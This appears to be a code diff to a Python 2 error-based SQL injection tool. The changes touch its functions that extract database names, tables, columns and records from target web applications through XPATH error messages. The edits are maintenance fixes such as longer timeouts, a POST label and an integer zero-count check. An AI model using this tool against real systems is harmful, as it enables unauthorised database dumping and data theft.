@@ -2308,13 +2308,13 @@ def dumpDbs(url, data):
                         FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                         try:
                             req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
+                            resp = urlopen(req, timeout=30)
                         except URLError as e:
                             URLError()
                             sleep(1)
                             pass
                         except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                             sleep(1)
                             pass
                         except (IOError, httplib.HTTPException) as e:
@@ -2338,7 +2338,7 @@ def dumpDbs(url, data):
                                                 FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                 try:
                                                     req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
+                                                    resp = urlopen(req, timeout=30)
                                                 except URLError as e:
                                                     URLError()
                                                     sleep(1)
@@ -2478,7 +2478,7 @@ def dumpDbs(url, data):
                                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                 req = Request(url, data=tgt, headers={'User-agent':ua})
                                 HTTPReqCount += 1
-                                resp = urlopen(req, timeout=10)
+                                resp = urlopen(req, timeout=30)
                             except URLError as e:
                                 URLError()
                                 sleep(1)
@@ -2503,8 +2503,8 @@ def dumpDbs(url, data):
                                         infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                         print fw + sn + '---'
                                         infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
+                                        print fw + sn + 'Parameter: (POST)'
+                                        infos += 'Parameter: (POST)\n'
                                         print fw + sn + '\tType: error-based'
                                         infos += '\tType: error-based\n'
                                         print fw + sn + '\tTitle: %s' % test
@@ -2548,7 +2548,7 @@ def dumpDbs(url, data):
                                                 FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                 try:
                                                     req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
+                                                    resp = urlopen(req, timeout=30)
                                                 except URLError as e:
                                                     URLError()
                                                     sleep(1)
@@ -2614,7 +2614,7 @@ def dumpDbs(url, data):
 
                                                                                         try:
                                                                                             req = Request(url, data=tempQuery, headers={'User-agent':ua})
-                                                                                            resp = urlopen(req, timeout=10)
+                                                                                            resp = urlopen(req, timeout=30)
                                                                                         except URLError as e:
                                                                                             URLError()
                                                                                             if temp == 0:
@@ -3004,7 +3004,7 @@ def  dumpTbl(url, data, db):
                                                                 Query_Test = True
                                                                 QueryToDumpDbNames = FinalCountQuery_replaced
                                                                 #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                                                if '0' in no_of_tbls:
+                                                                if int(no_of_tbls) == 0:
                                                                     print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                                                     break
                                                                 else:
@@ -3217,7 +3217,7 @@ def  dumpTbl(url, data, db):
                                         Query_Test = True
                                         QueryToDumpDbNames = FinalCountQuery_replaced
                                         #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                        if '0' in no_of_tbls:
+                                        if int(no_of_tbls) == 0:
                                             print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                             break
                                         else:
@@ -3486,7 +3486,7 @@ def  dumpTbl(url, data, db):
                                                             if 'XPATH syntax error' in respdata:
                                                                 Query_Test = True
                                                                 #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                                                if '0' in no_of_tbls:
+                                                                if int(no_of_tbls) == 0:
                                                                     print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                                                     break
                                                                 else:
@@ -3696,7 +3696,7 @@ def  dumpTbl(url, data, db):
                                     if 'XPATH syntax error' in respdata:
                                         Query_Test = True
                                         #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                        if '0' in no_of_tbls:
+                                        if int(no_of_tbls) == 0:
                                             print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                             break
                                         else:
@@ -3975,7 +3975,7 @@ def dumpCols(url, data, db, tbl):
                                                             if 'XPATH syntax error' in respdata:
                                                                 Query_Test = True
                                                                 #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                                                if '0' in no_of_cols:
+                                                                if int(no_of_cols) == 0:
                                                                     print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                                                     break
                                                                 else:
@@ -4188,7 +4188,7 @@ def dumpCols(url, data, db, tbl):
                                         Query_Test = True
                                         QueryToDumpDbNames = FinalCountQuery_replaced
                                         #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                        if '0' in no_of_cols:
+                                        if int(no_of_cols) == 0:
                                             print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                             break
                                         else:
@@ -4459,7 +4459,7 @@ def dumpCols(url, data, db, tbl):
                                                             if 'XPATH syntax error' in respdata:
                                                                 Query_Test = True
                                                                 #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                                                if '0' in no_of_cols:
+                                                                if int(no_of_cols) == 0:
                                                                     print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                                                     break
                                                                 else:
@@ -4672,7 +4672,7 @@ def dumpCols(url, data, db, tbl):
                                     if 'XPATH syntax error' in respdata:
                                         Query_Test = True
                                         #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                        if '0' in no_of_cols:
+                                        if int(no_of_cols) == 0:
                                             print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                             break
                                         else:
@@ -4959,7 +4959,7 @@ def dumpTblRecords(url, data, db, tbl, col):
                                                             no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                             if 'XPATH syntax error' in respdata:
                                                                 Query_Test = True
-                                                                if '0' in no_of_recs:
+                                                                if int(no_of_recs) == 0:
                                                                     print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                                                     break
                                                                 else:
@@ -5123,7 +5123,6 @@ def dumpTblRecords(url, data, db, tbl, col):
                 fd.close()
                 f.close()
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                infos = ""
             except Exception as e:
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                 pass
@@ -5154,6 +5153,7 @@ def dumpTblRecords(url, data, db, tbl, col):
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
                 for QueryIndex in REC_COUNT_FROM_TBL:
                     if not Query_Test:
+                        #QueryToTest = QueryIndex % (tbl)
                         QueryToTest = QueryIndex % (db,tbl)
                         if '0x72306f74' in tempfread:
                             FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
@@ -5180,7 +5180,7 @@ def dumpTblRecords(url, data, db, tbl, col):
                                     no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                     if 'XPATH syntax error' in respdata:
                                         Query_Test = True
-                                        if '0' in no_of_recs:
+                                        if int(no_of_recs) == 0:
                                             print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                             break
                                         else:
@@ -5189,6 +5189,7 @@ def dumpTblRecords(url, data, db, tbl, col):
                                             for QueryIndex in REC_DUMP_FROM_TBL:
                                                 if not dbvul:
                                                     QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
+                                                    #QueryToTest = QueryIndex % (ColumnList[0],tbl)
                                                     if '0x72306f74' in tempfread:
                                                         FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                         try:
@@ -5341,7 +5342,6 @@ def dumpTblRecords(url, data, db, tbl, col):
                 fd.close()
                 f.close()
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                infos = ""
             except Exception as e:
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                 pass
@@ -5461,7 +5461,7 @@ def dumpTblRecords(url, data, db, tbl, col):
                                                             no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                             if 'XPATH syntax error' in respdata:
                                                                 Query_Test = True
-                                                                if '0' in no_of_recs:
+                                                                if int(no_of_recs) == 0:
                                                                     print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                                                     break
                                                                 else:
@@ -5627,7 +5627,6 @@ def dumpTblRecords(url, data, db, tbl, col):
                 fd.close()
                 f.close()
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                infos = ""
             except Exception as e:
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                 pass
@@ -5684,7 +5683,7 @@ def dumpTblRecords(url, data, db, tbl, col):
                                     no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                     if 'XPATH syntax error' in respdata:
                                         Query_Test = True
-                                        if '0' in no_of_recs:
+                                        if int(no_of_recs) == 0:
                                             print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                             break
                                         else:
@@ -5843,7 +5842,6 @@ def dumpTblRecords(url, data, db, tbl, col):
                 fd.close()
                 f.close()
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                infos = ""
             except Exception as e:
                 print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                 pass
